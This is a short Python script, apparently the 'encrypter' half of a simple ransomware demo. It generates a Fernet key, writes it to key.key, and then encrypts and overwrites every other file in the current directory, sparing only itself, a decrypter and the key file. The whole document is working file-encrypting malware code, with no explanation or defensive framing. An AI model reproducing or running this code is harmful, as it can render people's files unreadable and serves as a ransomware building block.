from cryptography.fernet import Fernet
import os
files=[]
list_of_dir=os.listdir()
for i in list_of_dir:
    if i!="encrypter.py" and i!="decrypter.py" and i!="key.key" and os.path.isfile(i):
        files.append(i)
key=Fernet.generate_key()
with open("key.key","bw") as file1:
    file1.write(key)
    file1.close()
for j in files:
    with open(j,"br") as file:
        text=file.read()
        e_text=Fernet(key).encrypt(text)
        
        file.close()
    with open(j,"bw") as file2:
        file2.write(e_text)
        file2.close()